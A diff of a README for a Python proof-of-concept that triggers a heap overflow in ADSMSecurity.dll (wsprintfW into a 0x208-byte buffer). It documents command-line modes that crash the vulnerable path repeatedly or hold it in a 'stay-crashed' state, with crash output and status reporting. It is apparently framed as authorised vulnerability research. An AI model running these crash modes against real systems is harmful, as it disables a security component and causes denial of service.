@@ -3,75 +3,71 @@
 ## Overview
 Fixed and runnable version of F4 heap-overflow PoC: `wsprintfW(malloc(0x208), "%s\*.*", path)` at `sub_0x7410+0x74a4` -> `0xC0000374`.
 
-## Final CLI - Stays on Crash State + Observable From Outside
+## Features Implemented
 
-### 1. Stay-Crashed Mode (NEW - your request)
-Keeps ADSMSecurity.dll vulnerable path in **permanently crashed state** with external observability:
+### 1. Payload + Function Name Printed at Crash (NEW)
+Every crash now prints **payload that triggered it** and **function name**:
+
+```
+[CRASH] PAYLOAD THAT TRIGGERED HEAP CORRUPTION:
+  Function: sub_0x7410 (ADSMSecurity.dll + 0x7410) - recursive delete-tree walker
+  Vulnerable call: wsprintfW( malloc(0x208), "%s\*.*", path ) at sub_0x7410+0x74a4
+  Payload length: 1000 chars
+  Payload (preview): C:\AAAAA...AAAAA [len=1000]
+  Payload full (first 200): C:\AAAA...
+```
+
+- Worker (real + sim) prints PAYLOAD, FUNCTION, VULN at overflow input and at crash
+- Main prints `[MAIN] CRASH DETECTED - PAYLOAD AND FUNCTION:` with DLL+RVA
+- Sustain prints PAYLOAD/FUNCTION each iteration
+- Status JSON (`f4_crash_state.json`) now includes `payload`, `payload_preview`, `function`, `function_rva`
 
 ```bash
-# FINAL CLI - stays crashed indefinitely, observable:
-python f4_crash_poc.py --stay-crashed --len 1000
+python f4_crash_poc.py --len 1000
+python f4_crash_poc.py --len 300 --attempts 1
+```
 
-# With custom observable files:
+### 2. Stay-Crashed Mode - Observable From Outside
+Keeps vulnerable path in permanently crashed state:
+
+```bash
+python f4_crash_poc.py --stay-crashed --len 1000
 python f4_crash_poc.py --stay-crashed --len 1000 --duration 60 \
   --status-file ./f4_crash_state.json \
   --indicator-file ./f4_crashed.lock \
   --keep-alive 2
-
-# With HTTP status server (outside world can curl):
 python f4_crash_poc.py --stay-crashed --len 1000 --http-port 8080
-# then from outside:
 curl http://localhost:8080/
-cat f4_crash_state.json
-ls -l f4_crashed.lock   # exists = in crash state
+cat f4_crash_state.json   # contains payload + function
+ls -l f4_crashed.lock
 ```
 
-**What outside world sees:**
-- **status-file** (`f4_crash_state.json`): JSON updated every iteration:
-  ```json
-  {
-    "timestamp": "2026-09-06T10:54:59",
-    "pid": 1735,
-    "in_crash_state": true,
-    "stay_crashed": true,
-    "total_firings": 11,
-    "crashes": 11,
-    "crash_rate_percent": 100.0,
-    "last_exit_code": "0x00000017",
-    "last_exit_name": "HeapValidate FALSE - F4 confirmed",
-    "uptime_seconds": 1
-  }
-  ```
-- **indicator-file** (`f4_crashed.lock`): exists while in crash state, contains `CRASH_STATE ACTIVE pid=...`. Outside can `test -f f4_crashed.lock && echo CRASHED`.
-- **http-port**: tiny HTTP server on `0.0.0.0:PORT` returns same JSON on `GET /`. Works with Arena preview, curl, monitoring.
-
-### 2. Keep-Alive Hold (previous request)
+### 3. Keep-Alive Hold
 Keeps child alive holding DLL for N seconds:
 
 ```bash
 python f4_crash_poc.py --control --keep-alive 10
 python f4_crash_poc.py --len 100 --keep-alive 5
-python f4_crash_poc.py --len 1000 --keep-alive 5   # holds even when corrupted before crash
+python f4_crash_poc.py --len 1000 --keep-alive 5
 ```
 
-### 3. Classic Modes
+### 4. Classic Modes
 ```bash
 python f4_crash_poc.py --control
-python f4_crash_poc.py --len 100        # safe
-python f4_crash_poc.py --len 1000       # crash -> F4 CONFIRMED
+python f4_crash_poc.py --len 100
+python f4_crash_poc.py --len 1000
 python f4_crash_poc.py --sustain --len 1000 --duration 60
 ```
 
 ## Fixes Applied
-- Duplicate broken `main()` fixed
-- `%s` escaping bug fixed
+- Duplicate broken main() fixed
+- %s escaping bug fixed
 - POSIX exit truncation handled (23 = 0xC0000417)
 - Cross-platform simulation + guards
-- Added keep-alive + stay-crashed observable
+- Added keep-alive + stay-crashed observable + payload printing
 
 ## Safety
-- Non-existent path, throwaway child only, no service touched
-- Lab authorized only
+Non-existent path, throwaway child only, lab authorized only.
 
 ## Requirements
 Python 3.8+ stdlib only
